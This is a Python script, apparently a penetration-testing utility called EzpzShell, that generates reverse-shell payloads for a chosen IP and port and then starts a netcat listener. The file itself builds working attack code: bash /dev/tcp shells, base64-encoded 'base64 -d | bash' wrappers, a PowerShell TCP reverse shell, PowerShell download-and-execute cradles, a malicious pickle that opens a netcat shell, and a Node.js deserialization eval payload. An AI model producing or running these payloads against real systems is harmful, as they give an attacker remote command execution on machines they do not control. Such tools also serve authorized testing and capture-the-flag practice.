#!/usr/bin/python3
#coding=utf-8

######################################################################
#Script Name	: EzpzShell
#Description	: Collection Of Reverse Shell that can easily generate
#Author       	: H0j3n
#Twitter        : @h0j3n
#Github Link    : https://github.com/H0j3n/EzpzShell
######################################################################

import sys,re,os,base64,pickle,string,random
import netifaces as ni
from netifaces import AF_INET, AF_INET6, AF_LINK, AF_PACKET, AF_BRIDGE


class colors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[92m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    RESET = '\033[0m'
    WHITEBOLD = '\033[1m'
    ORANGE = '\033[1;33;40m'

def header():
	listPayload = ','.join([i for i in sorted(payload.keys())])
	print('''
  ______               _____ _          _ _
 |  ____|             / ____| |        | | |
 | |__   _____ __ ___| (___ | |__   ___| | |
 |  __| |_  / '_ \_  /\___ \| '_ \ / _ \ | |
 | |____ / /| |_) / / ____) | | | |  __/ | |
 |______/___| .__/___|_____/|_| |_|\___|_|_|
            | |
            |_|'''+f'''\n\n{colors.CYAN}[Payload Available]
{colors.RESET}''')
	# Payload Listing
	counter = 0
	for i in listPayload.split(","):
		print(f"{colors.GREEN}[{colors.RESET}"+i+f"{colors.GREEN}]{colors.RESET}",end=" ")
		counter += 1
		if counter == 10:
			counter = 0
			print()
	print(f'''{colors.CYAN}
\n[Usage]\n{colors.ORANGE}\npython3 {sys.argv[0]} 10.10.10.10 9001 py\n{colors.ORANGE}python3 {sys.argv[0]} tun0 9001 py{colors.RESET}''')

def load_shell():
	listShell = open("/opt/Tools/EzpzShell/shell.txt").read()
	for counter,i in enumerate(str(listShell).split("#INDEX")[1:]):
		for j in i.split("#EXAMPLE")[1:]:
			payload[list(payload.keys())[counter]].append(j)

def base64gen(ip,port):
	temp = 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'.replace("{IP}",ip).replace("{PORT}",port)
	return base64.b64encode(temp.encode('ascii'))

def base64gen_full(ip,port):
	temp = 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'.replace("{IP}",ip).replace("{PORT}",port)
	full_temp = 'echo '+base64.b64encode(temp.encode('ascii')).decode('ascii')+' | base64 -d | bash'
	return base64.b64encode(full_temp.encode('ascii'))

def base64gen_ps1(ip,port):
	temp = '$client = New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'.replace("{IP}",ip).replace("{PORT}",port)
	return base64.b64encode(temp.encode('UTF-16LE'))

def base64gen_ps1_2(ip,port):
	temp = '''IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1')'''.replace("{IP}",ip)
	return base64.b64encode(temp.encode('UTF-16LE'))

def base64gen_ps1_3(ip,port):
	temp = '''IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}'''.replace("{IP}",ip).replace("{PORT}",port)
	return base64.b64encode(temp.encode('UTF-16LE'))

def phpemoji(ip,port):
	list_emoji = {
		"0":"$🙂",
		"1":"$😀",
		"2":"$😁",
		"3":"$😅",
		"4":"$😆",
		"5":"$😉",
		"6":"$😊",
		"7":"$😎",
		"8":"$😍",
		"9":"$😚",
		".":"$🤔"
	}
	new_ip = ""
	new_port = ""
	#Retrieve New IP
	for i in ip:
		new_ip += list_emoji[i]
		new_ip += "."
	#Retrieve New Port
	for i in port:
		new_port += list_emoji[i]
		new_port += "."
	return new_ip[:-1],new_port[:-1]

def pickle_rce(ip,port):
	command = f'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port}' + ' >/tmp/f'
	class rce(object):
		def __reduce__(self):
			import os
			return (os.system,(command,))
	return base64.b64encode(pickle.dumps(rce()))

def char_encode(payload):
	encoded_payload = ""
	for char in payload:
		encoded_payload = encoded_payload + "," + str(ord(char))
	return encoded_payload[1:]
	
def get_random_string():
	# choose from all lowercase letter
	letters = string.ascii_lowercase + string.ascii_uppercase + string.digits
	result_str = ''.join(random.choice(letters) for i in range(20))
	return result_str

payload = {
	"py":[],
	"py3":[],
	"bash":[],
	"c":[],
	"nc":[],
	"php":[],
	"perl":[],
	"ruby":[],
	"haskell":[],
	"powershell":[],
	"node":[],
	"awk":[],
	"ncat":[],
	"msf_exe":[],
	"ssti":[],
	"cgibin":[],
	"jenkins":[],
	"tarpriv":[],
	"pickle":[],
	"java":[],
	"lua":[],
	"asp": [],
	"xxe": [],
	"jsp":[],
	"c#":[],
        "xsl":[],
        "yaml":[],
        "sql":[],
        "wordpress":[],
        "json.net":[],
        "msf_raw":[],
        "msf_dll":[],
        "msf_elf":[],
        "dag":[],
        "firebird":[],
}

if __name__ == "__main__":
	if len(sys.argv) < 4:
		header()
		sys.exit(-1)
	load_shell()
	options = sys.argv[3]
	port = sys.argv[2]
	ip = ""
	try:
		ip = ni.ifaddresses(sys.argv[1])[AF_INET][0]['addr']
	except:
		aa=re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$",sys.argv[1])
		if aa:
			ip = sys.argv[1]
		else:
			print("\nCheck If IP is valid")
			ip = sys.argv[1]

	for counter,j in enumerate(payload[options.lower()]):
		print(f"\n{colors.GREEN}Example {counter+1}{colors.RESET}\n")
		if "{BASE64}" in j:
			temp = base64gen(ip,port)
			full_temp = j.strip().replace("{BASE64}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip()
			if "{YAML_PY}" in j:
				only_b64 = full_temp.replace("{YAML_PY}","")
				print(full_temp.replace("{YAML_PY}","Full Base64 Payload: "+base64.b64encode(only_b64.encode('ascii')).decode('ascii')))
			else:
				print(full_temp)
		elif "{BASE64_FULL}" in j:
			temp = base64gen_full(ip,port)
			full_temp = j.strip().replace("{BASE64_FULL}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip()
			if "{YAML_PY}" in j:
				only_b64 = full_temp.replace("{YAML_PY}","")
				print(full_temp.replace("{YAML_PY}","Full Base64 Payload: "+base64.b64encode(only_b64.encode('ascii')).decode('ascii')))
			else:
				print(full_temp)
		elif "{BASE64PS1}" in j:
			temp = base64gen_ps1(ip,port)
			print(j.strip().replace("{BASE64PS1}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip())
		elif "{BASE64PS1_2}" in j:
			temp = base64gen_ps1_2(ip,port)
			print(j.strip().replace("{BASE64PS1_2}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip())
		elif "{BASE64PS1_3}" in j:
			temp = base64gen_ps1_3(ip,port)
			print(j.strip().replace("{BASE64PS1_3}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip())
		elif "{PICKLE}" in j:
			temp = pickle_rce(ip,port)
			print(j.strip().replace("{PICKLE}",temp.decode("ascii")))
		elif "{PHPEMOJI}" in j:
			new_ip,new_port = phpemoji(ip,port)
			print(j.strip().replace("{PHPEMOJI}","").replace("{IP}",new_ip).replace("{PORT}",new_port).strip())
		elif "{RC4RANDOM}" in j:
			temprandom = get_random_string()
			print(j.strip().replace("{RC4RANDOM}",temprandom).replace("{IP}",ip).replace("{PORT}",port).strip())
		elif "{NODEJS_DESERIALIZATION}" in j:
			temp = j.strip().replace("{NODEJS_DESERIALIZATION}","").replace("{IP}",ip).replace("{PORT}",port).strip()
			temp2 = char_encode(temp)
			print('{"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % temp2)
			base64payload = '{"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % temp2
			print(f"\n{base64.b64encode(base64payload.encode('ascii')).decode('ascii')}")

		else:
			print(j.strip().replace("{IP}",ip).replace("{PORT}",port))
	print(F"\n{colors.CYAN}[*]{colors.RESET} {colors.WHITEBOLD}Starting the listener on {port}\n")
	os.system('nc -lvnp '+ str(port))
	print(colors.RESET)
